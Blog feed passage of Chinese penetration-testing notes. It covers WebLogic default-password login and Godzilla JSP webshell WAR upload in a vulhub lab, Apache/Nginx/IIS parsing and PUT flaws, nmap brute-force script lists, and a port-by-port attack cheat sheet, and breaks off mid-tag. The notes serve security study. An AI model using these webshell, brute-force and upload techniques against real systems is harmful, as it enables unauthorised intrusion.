href="https://baike.baidu.com/item/%E5%BC%80%E5%8F%91/9400971">开发</a>、集成、部署和管理大型分布式Web应用、<a href="https://baike.baidu.com/item/%E7%BD%91%E7%BB%9C%E5%BA%94%E7%94%A8/2196523">网络应用</a>和<a href="https://baike.baidu.com/item/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%BA%94%E7%94%A8/10563731">数据库应用</a>的Java<a href="https://baike.baidu.com/item/%E5%BA%94%E7%94%A8%E6%9C%8D%E5%8A%A1%E5%99%A8">应用服务器</a>。将Java的动态功能和Java Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中。</p><p>WebLogic Server具有开发和部署关键任务电子商务Web应用系统 所需的多种特色和优势。</p><a id="more"></a><p>weblogic是java EE的应用服务器（application server），包括ejb ,jsp,servlet,jms等等，全能型的。是商业软件里排名第一的容器（JSP、servlet、EJB等），并提供其他如JAVA编辑等工具，是一个综合的开发及运行环境。(收费)</p><!--more--><p><img src="/2022/03/20/middleware-java/image-20220323214802592.png" alt="image-20220323214802592"></p><p>以下环境为vulhub靶场环境</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;vulhub&#x2F;vulhub.git</span><br></pre></td></tr></table></figure><h2 id="弱口令-上传war包"><a href="#弱口令-上传war包" class="headerlink" title="弱口令+上传war包"></a>弱口令+上传war包</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>weblogic搭建完后没有修改后台登陆密码/后台登陆为弱口令</p><h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><p>启动环境</p><p><img src="/2022/03/20/middleware-java/image-20220324002901248.png" alt="image-20220324002901248"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.119.165:7001&#x2F;console       访问后台</span><br></pre></td></tr></table></figure><p><img src="/2022/03/20/middleware-java/image-20220324010752442.png" alt="image-20220324010752442"></p><p>weblogic/Oracle@123登陆后台（bp爆破，密码错五次就会禁止认证）</p><p>弱口令参考：<a href="https://cirt.net/passwords?criteria=WebLogic">Default Passwords | CIRT.net</a></p><p>下面要准备war包上传</p><p><img src="/2022/03/20/middleware-java/image-20220324011153236.png" alt="image-20220324011153236"></p><p>点上传文件</p><p><img src="/2022/03/20/middleware-java/image-20220324011308204.png" alt="image-20220324011308204"></p><p>将jsp马（哥斯拉生成jsp）打包成war包</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jar -cvf shell.war 1.jsp</span><br></pre></td></tr></table></figure><p><img src="/2022/03/20/middleware-java/image-20220324011818173.png" alt="image-20220324011818173"></p><p>然后一直下一步，完成</p><p><img src="/2022/03/20/middleware-java/image-20220324011923927.png" alt="image-20220324011923927"></p><p>成功上传</p><p><img src="/2022/03/20/middleware-java/image-20220324012109060.png" alt="image-20220324012109060"></p><p>访问：<a href="http://192.168.119.165:7001/shell/1.jsp">http://192.168.119.165:7001/shell/1.jsp</a> ，shell连接</p><p><img src="/2022/03/20/middleware-java/image-20220324014607221.png" alt="image-20220324014607221"></p><p><img src="/2022/03/20/middleware-java/image-20220324014649096.png" alt="image-20220324014649096"></p><p>参考：<a href="https://xz.aliyun.com/t/9932#toc-4">weblogic漏洞大杂烩 - 先知社区 (aliyun.com)</a></p><p>工具：(<a href="https://github.com/0xn0ne/weblogicScanner">https://github.com/0xn0ne/weblogicScanner</a>)</p><h1 id="Tomcat"><a href="#Tomcat" class="headerlink" title="Tomcat"></a>Tomcat</h1><h1 id="Jboss"><a href="#Jboss" class="headerlink" title="Jboss"></a>Jboss</h1><ol><li>jboss/jboss +war上传</li></ol><h1 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h1><h3 id="HTTPD-换行解析漏洞"><a href="#HTTPD-换行解析漏洞" class="headerlink" title="HTTPD 换行解析漏洞"></a>HTTPD 换行解析漏洞</h3><p>CVE-2017-15715     2.4.0~2.4.29</p><p><code>/phpinfo.php%0a</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch \.php$&gt; </span><br><span class="line">SetHandler application&#x2F;x-httpd-php </span><br><span class="line">&lt;&#x2F;FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>$符号不仅匹配字符串结尾位置，也可以匹配\n 或 \r。 导致/phpinfo.php\x0A能够被解析</p><p>上传 xxx.php%0a 绕过后缀限制。</p><p>访问： xxx.com/phpinfo.php%0a 即可</p><h1 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h1><h3 id="解析漏洞"><a href="#解析漏洞" class="headerlink" title="解析漏洞"></a>解析漏洞</h3><p>配置文件错误导致 正常123.jpg    访问时候  .com/123.jpg/xxxxxx.php      123.jpg会以php形式解析</p><p>漏洞配置如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">server &#123; </span><br><span class="line">location ~ \.php$ &#123; </span><br><span class="line">root            &#x2F;work&#x2F;www&#x2F;test; </span><br><span class="line">fastcgi_index   index.php; </span><br><span class="line">fastcgi_param   SCRIPT_FILENAME </span><br><span class="line">$document_root  $fastcgi_script_name; </span><br><span class="line">include         fastcgi_params; </span><br><span class="line">fastcgi_pass    unix:&#x2F;tmp&#x2F;php-fpm.sock; </span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>com/123.jpg/xxxxxx.php    首先<code>PHP fastcgi</code> 进行处理，但找不到xxxxxx.php，</p><p>又由于<code>cgi.fix_pathinfo</code>默认是开启的，因此PHP 会继续检查路径中存在的文件，并将 </p><p>多余的部分当作 PATH_INFO。接着PHP在文件系统中找到.jpg文件，而后以PHP的形式执行.jpg的内容，并将/xxx.php存储在 PATH_INFO 后丢弃</p><h1 id="IIs"><a href="#IIs" class="headerlink" title="IIs"></a>IIs</h1><h3 id="IIS-6-0-解析漏洞"><a href="#IIS-6-0-解析漏洞" class="headerlink" title="IIS 6.0 解析漏洞"></a>IIS 6.0 解析漏洞</h3><p>（*.asp;.jpg             *.asp/test.jpg   ）</p><ul><li><p>*.asp;.jpg ，服务器默认不解析<code>;</code>后面的内容。</p></li><li><p>*.asp/目录下的文件被当作asp解析。</p></li></ul><h3 id="IIS7-x-文件解析漏洞"><a href="#IIS7-x-文件解析漏洞" class="headerlink" title="IIS7.x  文件解析漏洞"></a>IIS7.x  文件解析漏洞</h3><p> (test.jpg/.php)</p><ul><li>在IIS7/7.5 FastCGI运行模式下，在任意文件，例：test.jpg后面加上/.php，会将test.jpg 解析为php文件。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">原因cgi.fix_pathinfo&#x3D;1</span><br></pre></td></tr></table></figure><h3 id="IIS-6-0-PUT漏洞"><a href="#IIS-6-0-PUT漏洞" class="headerlink" title="IIS 6.0 PUT漏洞"></a>IIS 6.0 PUT漏洞</h3><ul><li>IIS的 Web 服务扩展中开启了 WebDAV之后，<code>支持多种请求</code>，配合写入权限，可造成任意文件写入(PUT写 webshell)。</li></ul><h3 id="短文件名"><a href="#短文件名" class="headerlink" title="短文件名"></a>短文件名</h3><ul><li>为了兼容<code>16</code>位<code>MS-DOS</code>程序，Windows为文件名较长的文件（和文件夹）生成了对应的<code>Windows 8.3</code>短文件名。</li></ul><p>​        </p><p>​                                                          左边短文件名                右边文件名</p><p><img src="/2022/03/20/middleware-java/image-20220415203407334.png" alt="image-20220415203407334"></p><p>/xxx.xxx.xx.xx/A*~1/xxx</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">当访问构造的某个存在的短文件名，会返回404</span><br></pre></td></tr></table></figure><p>/xxx.xxx.xx.xx/AB*~1/xxx</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">当访问构造的某个不存在的短文件名，会返回400；</span><br></pre></td></tr></table></figure><p>目前IIS支持短文件名猜测的HTTP方法主要包括：DEBUG、OPTIONS、GET、POST、HEAD、TRACE六种。 </p><p>IIS 8.0之后的版本只能通过OPTIONS和TRACE方法被猜测成功。</p><p>IIS8.0以下版本需要开启ASP.NET支持，IIS大于等于8.0版本,即使没有安装ASP.NET，通过OPTIONS和TRACE方法也可以猜解成功。 </p><p>以下通过开启IIS6.0 ASP.NET后进行复现。</p><p>（参考网上）</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;Weblogic&quot;&gt;&lt;a href=&quot;#Weblogic&quot; class=&quot;headerlink&quot; title=&quot;Weblogic&quot;&gt;&lt;/a&gt;Weblogic&lt;/h1&gt;&lt;p&gt;默认端口：&lt;code&gt;7001&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;部分历史漏洞&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1. 弱口令&amp;#x2F;任意文件读取+后台war包&amp;#x2F;任意文件上传getshell&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2. CVE-2017-20271&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3. CVE-2018-2628&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4. CVE-2019-2725&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5. CVE-2020-2555&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6. CVE-2021-2394&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;WebLogic是&lt;a href=&quot;https://baike.baidu.com/item/%E7%BE%8E%E5%9B%BDOracle%E5%85%AC%E5%8F%B8/9952086&quot;&gt;美国Oracle公司&lt;/a&gt;出品的一个application server，确切的说是一个基于&lt;a href=&quot;https://baike.baidu.com/item/JAVAEE/3066623&quot;&gt;JAVAEE&lt;/a&gt;架构的&lt;a href=&quot;https://baike.baidu.com/item/%E4%B8%AD%E9%97%B4%E4%BB%B6/452240&quot;&gt;中间件&lt;/a&gt;，WebLogic是用于&lt;a href=&quot;https://baike.baidu.com/item/%E5%BC%80%E5%8F%91/9400971&quot;&gt;开发&lt;/a&gt;、集成、部署和管理大型分布式Web应用、&lt;a href=&quot;https://baike.baidu.com/item/%E7%BD%91%E7%BB%9C%E5%BA%94%E7%94%A8/2196523&quot;&gt;网络应用&lt;/a&gt;和&lt;a href=&quot;https://baike.baidu.com/item/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%BA%94%E7%94%A8/10563731&quot;&gt;数据库应用&lt;/a&gt;的Java&lt;a href=&quot;https://baike.baidu.com/item/%E5%BA%94%E7%94%A8%E6%9C%8D%E5%8A%A1%E5%99%A8&quot;&gt;应用服务器&lt;/a&gt;。将Java的动态功能和Java Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中。&lt;/p&gt;
&lt;p&gt;WebLogic Server具有开发和部署关键任务电子商务Web应用系统 所需的多种特色和优势。&lt;/p&gt;</summary>
    
    
    
    <category term="中间件" scheme="http://example.com/categories/%E4%B8%AD%E9%97%B4%E4%BB%B6/"/>
    
    
    <category term="中间件" scheme="http://example.com/tags/%E4%B8%AD%E9%97%B4%E4%BB%B6/"/>
    
  </entry>
  
  <entry>
    <title>信息收集</title>
    <link href="http://example.com/2022/03/18/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    <id>http://example.com/2022/03/18/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</id>
    <published>2022-03-18T08:03:33.000Z</published>
    <updated>2022-05-16T10:34:33.369Z</updated>
    
    <content type="html"><![CDATA[<p>参考</p><p>本文参考：<a href="https://github.com/Qftm/Information_Collection_Handbook">https://github.com/Qftm/Information_Collection_Handbook</a></p><h1 id="域名信息"><a href="#域名信息" class="headerlink" title="域名信息"></a>域名信息</h1><p>查询域名是否已经被注册，以及注册域名和注册人的详细信息</p><h3 id="whois查询"><a href="#whois查询" class="headerlink" title="whois查询"></a>whois查询</h3><ul><li>站长之家：<a href="http://whois.chinaz.com/">http://whois.chinaz.com/</a></li><li>国外：       <a href="https://www.whois.com/">https://www.whois.com/</a></li><li>腾讯云：  <a href="https://whois.cloud.tencent.com/domain?domain=">https://whois.cloud.tencent.com/domain?domain=</a></li></ul><a id="more"></a><h3 id="备案信息查询"><a href="#备案信息查询" class="headerlink" title="备案信息查询"></a>备案信息查询</h3><ul><li><a href="https://www.sec.gov/edgar/searchedgar/companysearch.html">美国企业备案查询</a></li><li><a href="http://www.beianbeian.com/">ICP备案查询网</a></li><li><a href="http://www.beian.miit.gov.cn/publish/query/indexFirst.action">工业和信息化部ICP/IP/域名信息备案管理</a></li></ul><h3 id="信用信息查询"><a href="#信用信息查询" class="headerlink" title="信用信息查询"></a>信用信息查询</h3><ul><li><p><a href="http://www.gsxt.gov.cn/index.html">国家企业信用信息公示系统</a></p></li><li><p><a href="http://company.xizhi.com/">悉知-全国企业信息查询</a></p></li><li><p><a href="https://www.creditchina.gov.cn/">信用中国-个人信用查询搜索-企业信息查询搜索-统一社会信用代码查询</a></p></li></ul><h3 id="浏览器插件"><a href="#浏览器插件" class="headerlink" title="浏览器插件"></a>浏览器插件</h3><p>myip.ms</p><p>TCPIPUTILS</p><p>DNSlytics</p><p>个人暂时没有用过</p><h3 id="应用信息"><a href="#应用信息" class="headerlink" title="应用信息"></a>应用信息</h3><p><a href="https://www.tianyancha.com/">天眼查-商业安全工具</a></p><hr><h1 id="反查（ip-域名）"><a href="#反查（ip-域名）" class="headerlink" title="反查（ip/域名）"></a>反查（ip/域名）</h1><h3 id="Dnslytics"><a href="#Dnslytics" class="headerlink" title="Dnslytics"></a>Dnslytics</h3><p><a href="https://dnslytics.com/">https://dnslytics.com/</a></p><hr><h1 id="子域名收集"><a href="#子域名收集" class="headerlink" title="子域名收集"></a>子域名收集</h1><h3 id="在线工具"><a href="#在线工具" class="headerlink" title="在线工具"></a>在线工具</h3><ul><li><a href="http://tool.chinaz.com/subdomain/?domain=">站长工具</a></li><li><a href="https://hackertarget.com/find-dns-host-records/">hackertarget</a></li><li><a href="https://phpinfo.me/domain/">phpinfo</a></li><li><a href="https://www.t1h2ua.cn/tools/">t1h2ua</a></li><li><a href="https://dnsdumpster.com/">dnsdumpster</a></li><li><a href="http://z.zcjun.com/">zcjun</a></li></ul><p>phpinfo  还行</p><h3 id="枚举工具"><a href="#枚举工具" class="headerlink" title="枚举工具"></a>枚举工具</h3><p><a href="https://github.com/shmilylty/OneForAll">OneForAll</a></p><p>Layer</p><h3 id="搜索引擎"><a href="#搜索引擎" class="headerlink" title="搜索引擎"></a>搜索引擎</h3><p>google hack ：site:xxx</p><p>FOFA，hunter等（domain:xxxxx）</p><hr><h1 id="域名对应ip"><a href="#域名对应ip" class="headerlink" title="域名对应ip"></a>域名对应ip</h1><h3 id="判断是否有CDN"><a href="#判断是否有CDN" class="headerlink" title="判断是否有CDN"></a>判断是否有CDN</h3><ol><li>多地ping，查看ip是否改变</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;ping.chinaz.com&#x2F;</span><br></pre></td></tr></table></figure><ol start="2"><li>Nslookup    通过不用DNS解析目标域名，  结果不一样可能存在CDN</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nslookup www.dfle.com.cn 8.8.8.8</span><br><span class="line">nslookup www.dfle.com.cn 114.114.114.114</span><br><span class="line">nslookup www.dfle.com.cn                       Nslookup    默认解析</span><br></pre></td></tr></table></figure><ol start="4"><li>利用工具检测</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cdnplanet        https:&#x2F;&#x2F;www.cdnplanet.com&#x2F;tools&#x2F;cdnfinder&#x2F;</span><br></pre></td></tr></table></figure><h3 id="绕过CND查真实ip查询"><a href="#绕过CND查真实ip查询" class="headerlink" title="绕过CND查真实ip查询"></a>绕过CND查真实ip查询</h3><ol><li>目标邮件服务器一般没有CDN</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">目标网站的邮箱注册、找回密码或者RSS订阅</span><br><span class="line">功能，查看邮件、寻找邮件头中的邮件服务器域名IP，ping这个邮件服务器的域名,</span><br></pre></td></tr></table></figure><ol start="2"><li>国外ping</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;tools.ipip.net&#x2F;newping.php</span><br><span class="line">https:&#x2F;&#x2F;asm.ca.com&#x2F;en&#x2F;ping.php</span><br></pre></td></tr></table></figure><ol start="3"><li>国外DNS解析</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.ab173.com&#x2F;dns&#x2F;dns_world.php</span><br><span class="line">nslookup    www.xxx.com   *.*.*.*</span><br></pre></td></tr></table></figure><ol start="4"><li>一般主域名没有什么功能，不会添加CND，对应子域可能会添加CDN。</li></ol><p>有可能子域ip和和主域名ip一样，或者在一个c端。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;phpinfo.me&#x2F;bing.php</span><br></pre></td></tr></table></figure><ol><li>国外请求</li></ol><h3 id="网络空间搜索引擎"><a href="#网络空间搜索引擎" class="headerlink" title="网络空间搜索引擎"></a>网络空间搜索引擎</h3><p>shodan:     <a href="https://www.shodan.io/">https://www.shodan.io/</a></p><p>zoomeye：<a href="https://www.zoomeye.org/">https://www.zoomeye.org/</a></p><p>fafa:            <a href="https://fofa.info/toLogin">https://fofa.info/toLogin</a></p><p>hunter:       <a href="https://hunter.qianxin.com/">https://hunter.qianxin.com/</a></p><ol><li>(结合脚本，进行批量) </li><li>能够快速发现目标网站的一些服务</li></ol><hr><h1 id="端口"><a href="#端口" class="headerlink" title="端口"></a>端口</h1><h3 id="扫描工具"><a href="#扫描工具" class="headerlink" title="扫描工具"></a>扫描工具</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Nmap      可以细扫端口和漏洞</span><br><span class="line"></span><br><span class="line">nmap -T4 -A -v -Pn </span><br><span class="line"></span><br><span class="line">（扫描端口并且标记可以爆破的服务）</span><br><span class="line">nmap 127.0.0.1 --script&#x3D;ftp-brute,imap-brute,smtp-brute,pop3-brute,mongodb-brute,redis-brute,ms-sql-brute,rlogin-brute,rsync-brute,mysql-brute,pgsql-brute,oracle-sid-brute,oracle-brute,rtsp-url-brute,snmp-brute,svn-brute,telnet-brute,vnc-brute,xmpp-brute </span><br><span class="line"></span><br><span class="line">判断常见的漏洞并扫描端口</span><br><span class="line">nmap 127.0.0.1 --script&#x3D;auth,vuln</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">精确判断漏洞并扫描端口</span><br><span class="line">nmap 127.0.0.1 --script&#x3D;dns-zone-transfer,ftp-anon,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,http-backup-finder,http-cisco-anyconnect,http-iis-short-name-brute,http-put,http-php-version,http-shellshock,http-robots.txt,http-svn-enum,http-webdav-scan,iis-buffer-overflow,iax2-version,memcached-info,mongodb-info,msrpc-enum,ms-sql-info,mysql-info,nrpe-enum,pptp-version,redis-info,rpcinfo,samba-vuln-cve-2012-1182,smb-vuln-ms08-067,smb-vuln-ms17-010,snmp-info,sshv1,xmpp-info,tftp-enum,teamspeak2-version</span><br></pre></td></tr></table></figure><p><a href="https://github.com/nmap/nmap">https://github.com/nmap/nmap</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Masscan   主要全端口扫描</span><br></pre></td></tr></table></figure><p><a href="https://github.com/robertdavidgraham/masscan">https://github.com/robertdavidgraham/masscan</a></p><p>masscan+nmap</p><p>全端口+服务探测 （copy的）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># masscan 192.33.6.145 -p1-65535  --rate 1000 -oL ports</span><br><span class="line"></span><br><span class="line"># ports&#x3D;$(cat ports | awk -F &quot; &quot; &#39;&#123;print $3&#125;&#39; | sort -n | tr &#39;\n&#39; &#39;,&#39;  | sed &#39;s&#x2F;,$&#x2F;&#x2F;&#39; | sed &#39;s&#x2F;^,,&#x2F;&#x2F;&#39;)</span><br><span class="line"></span><br><span class="line"># nmap -sV -p $ports 192.33.6.145</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Zmap</span><br></pre></td></tr></table></figure><p><a href="https://github.com/zmap/zmap">https://github.com/zmap/zmap</a></p><h3 id="网络空间搜索引擎-1"><a href="#网络空间搜索引擎-1" class="headerlink" title="网络空间搜索引擎"></a>网络空间搜索引擎</h3><p>fofa，hunter</p><p><a href="https://fofa.info/">网络空间测绘，网络空间安全搜索引擎，网络空间搜索引擎，安全态势感知 - FOFA网络空间测绘系统</a></p><p><a href="https://hunter.qianxin.com/">鹰图平台 (qianxin.com)</a></p><h3 id="浏览器插件-1"><a href="#浏览器插件-1" class="headerlink" title="浏览器插件"></a>浏览器插件</h3><p>fofa-view</p><p>TCPIPUTILS</p><h3 id="端口利用"><a href="#端口利用" class="headerlink" title="端口利用"></a>端口利用</h3><p>copy的 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">端口：21 服务：FTP&#x2F;TFTP&#x2F;VSFTPD 总结：爆破&#x2F;嗅探&#x2F;溢出&#x2F;后门</span><br><span class="line">端口：22 服务：ssh远程连接      总结：爆破&#x2F;openssh漏洞</span><br><span class="line">端口：23 服务：Telnet远程连接   总结：爆破&#x2F;嗅探&#x2F;弱口令</span><br><span class="line">端口：25 服务：SMTP邮件服务     总结：邮件伪造</span><br><span class="line">端口：53 服务：DNS域名解析系统   总结：域传送&#x2F;劫持&#x2F;缓存投毒&#x2F;欺骗</span><br><span class="line">端口：67&#x2F;68 服务：dhcp服务      总结：劫持&#x2F;欺骗</span><br><span class="line">端口：110 服务：pop3              总结：爆破&#x2F;嗅探</span><br><span class="line">端口：139 服务：Samba服务         总结：爆破&#x2F;未授权访问&#x2F;远程命令执行</span><br><span class="line">端口：143 服务：Imap协议         总结：爆破161SNMP协议爆破&#x2F;搜集目标内网信息</span><br><span class="line">端口：389 服务：Ldap目录访问协议 总结：注入&#x2F;未授权访问&#x2F;弱口令</span><br><span class="line">端口：445 服务：smb              总结：ms17-010&#x2F;端口溢出</span><br><span class="line">端口：512&#x2F;513&#x2F;514 服务：Linux Rexec服务 总结：爆破&#x2F;Rlogin登陆</span><br><span class="line">端口：873 服务：Rsync服务                 总结：文件上传&#x2F;未授权访问</span><br><span class="line">端口：1080 服务：socket                  总结：爆破</span><br><span class="line">端口：1352 服务：Lotus domino邮件服务   总结：爆破&#x2F;信息泄漏</span><br><span class="line">端口：1433 服务：mssql                  总结：爆破&#x2F;注入&#x2F;SA弱口令</span><br><span class="line">端口：1521 服务：oracle       总结：爆破&#x2F;注入&#x2F;TNS爆破&#x2F;反弹shell2049Nfs服务配置不当</span><br><span class="line">端口：2181 服务：zookeeper服务            总结：未授权访问</span><br><span class="line">端口：2375 服务：docker remote api    总结：未授权访问</span><br><span class="line">端口：3306 服务：mysql                 总结：爆破&#x2F;注入</span><br><span class="line">端口：3389 服务：Rdp远程桌面链接        总结：爆破&#x2F;shift后门</span><br><span class="line">端口：4848 服务：GlassFish控制台       总结：爆破&#x2F;认证绕过</span><br><span class="line">端口：5000 服务：sybase&#x2F;DB2数据库      总结：爆破&#x2F;注入&#x2F;提权</span><br><span class="line">端口：5432 服务：postgresql             总结：爆破&#x2F;注入&#x2F;缓冲区溢出</span><br><span class="line">端口：5632 服务：pcanywhere服务        总结：抓密码&#x2F;代码执行</span><br><span class="line">端口：5900 服务：vnc                     总结：爆破&#x2F;认证绕过</span><br><span class="line">端口：6379 服务：Redis数据库           总结：未授权访问&#x2F;爆破</span><br><span class="line">端口：7001&#x2F;7002 服务：weblogic         总结：java反序列化&#x2F;控制台弱口令</span><br><span class="line">端口：80&#x2F;443 服务：http&#x2F;https         总结：web应用漏洞&#x2F;心脏滴血</span><br><span class="line">端口：8069 服务：zabbix服务            总结：远程命令执行&#x2F;注入</span><br><span class="line">端口：8161 服务：activemq             总结：弱口令&#x2F;写文件</span><br><span class="line">端口：8080&#x2F;8089 服务：Jboss&#x2F;Tomcat&#x2F;Resin 总结：爆破&#x2F;PUT文件上传&#x2F;反序列化</span><br><span class="line">端口：8083&#x2F;8086 服务：influxDB         总结：未授权访问</span><br><span class="line">端口：9000 服务：fastcgi                 总结：远程命令执行</span><br><span class="line">端口：9090 服务：Websphere             总结：控制台爆破&#x2F;java反序列化&#x2F;弱口令</span><br><span class="line">端口：9200&#x2F;9300 服务：elasticsearch   总结：远程代码执行</span><br><span class="line">端口：11211 服务：memcached             总结：未授权访问</span><br><span class="line">端口：27017&#x2F;27018 服务：mongodb         总结：未授权访问&#x2F;爆破</span><br></pre></td></tr></table></figure><hr><h1 id="指纹识别"><a href="#指纹识别" class="headerlink" title="指纹识别"></a>指纹识别</h1><h3 id="在线平台"><a href="#在线平台" class="headerlink" title="在线平台"></a>在线平台</h3><p>潮汐 (<a href="http://finger.tidesec.com/">http://finger.tidesec.com/</a>)</p><p>云溪  (<a href="https://www.yunsee.cn/">https://www.yunsee.cn/</a>)   收费</p><p> (bugscaner.com)(<a href="http://whatweb.bugscaner.com/look/">http://whatweb.bugscaner.com/look/</a>)</p><p>(shuziguanxing.com)(<a href="https://fp.shuziguanxing.com/#/">https://fp.shuziguanxing.com/#/</a>)</p><p>GoeEye平台 (<a href="https://www.godeye.vip/index/">https://www.godeye.vip/index/</a>)</p><h3 id="github工具"><a href="#github工具" class="headerlink" title="github工具"></a>github工具</h3><p>WhatWeb</p><p><a href="https://github.com/TideSec/TideFinger">TideFinger</a></p><p><a href="https://github.com/Tuhinshubhra/CMSeeK">Tuhinshubhra/CMSeeK: CMS Detection and Exploitation suite - Scan WordPress, Joomla, Drupal and over 180 other CMSs (github.com)</a></p><p><a href="https://github.com/Lucifer1993/AngelSword">Lucifer1993/AngelSword: Python3编写的CMS漏洞检测框架 (github.com)</a></p><h3 id="浏览器插件-2"><a href="#浏览器插件-2" class="headerlink" title="浏览器插件"></a>浏览器插件</h3><p>Wappalyzer</p><h1 id="敏感信息"><a href="#敏感信息" class="headerlink" title="敏感信息"></a>敏感信息</h1><h3 id="waf识别"><a href="#waf识别" class="headerlink" title="waf识别"></a>waf识别</h3><p>wafw00f</p><p><a 